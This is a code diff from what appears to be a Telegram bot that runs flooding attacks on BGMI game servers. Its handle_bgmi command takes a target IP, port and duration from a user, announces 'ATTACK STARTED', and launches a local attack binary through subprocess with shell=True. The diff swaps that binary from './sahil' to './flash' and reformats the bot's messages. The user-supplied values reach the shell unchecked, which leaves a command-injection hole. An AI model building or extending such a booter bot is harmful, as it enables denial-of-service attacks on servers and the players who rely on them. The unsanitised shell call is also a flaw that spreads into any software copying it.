@@ -227,23 +227,23 @@ def handle_bgmi(message):
                 log_command(user_id, target, port, time)
                 
                 # Stylish attack start message
-                bot.reply_to(message, f"🔥 **ATTACK STARTED!** 🔥\n\n"
-                                      f"🎯 **Target:** `{target}`\n\n"
-                                      f"🚀 **Port:** `{port}`\n\n"
-                                      f"⏳ **Duration:** `{time} seconds`\n\n"
-                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7`\n\n", 
+                bot.reply_to(message, f"🔥 **ATTACK STARTED!** 🔥\n"
+                                      f"🎯 **Target:** `{target}`\n"
+                                      f"🚀 **Port:** `{port}`\n"
+                                      f"⏳ **Duration:** `{time} seconds`\n"
+                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7`\n", 
                                       parse_mode="Markdown")
 
-                full_command = f"./sahil {target} {port} {time}"
+               full_command = f"./flash {target} {port} {time} 110"
                 subprocess.run(full_command, shell=True)
 
                 # Stylish attack completion message
-                bot.reply_to(message, f"✅ **ATTACK FINISHED!** ✅\n\n"
-                                      f"🎯 **Target:** `{target}\n\n"
-                                      f"🚀 **Port:** `{port}`\n\n"
-                                      f"⏳ **Duration:** `{time} seconds\n\n"
-                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7\n\n"
-                                      f"💪 *Mission Accomplished!* 🎯\n\n", 
+                bot.reply_to(message, f"✅ **ATTACK FINISHED!** ✅\n"
+                                      f"🎯 **Target:** `{target}\n"
+                                      f"🚀 **Port:** `{port}`\n"
+                                      f"⏳ **Duration:** `{time} seconds\n"
+                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7\n"
+                                      f"💪 *Mission Accomplished!* 🎯\n", 
                                       parse_mode="Markdown")
         else:
             response = "✅Usage:- /bgmi <target> <port> <time>"
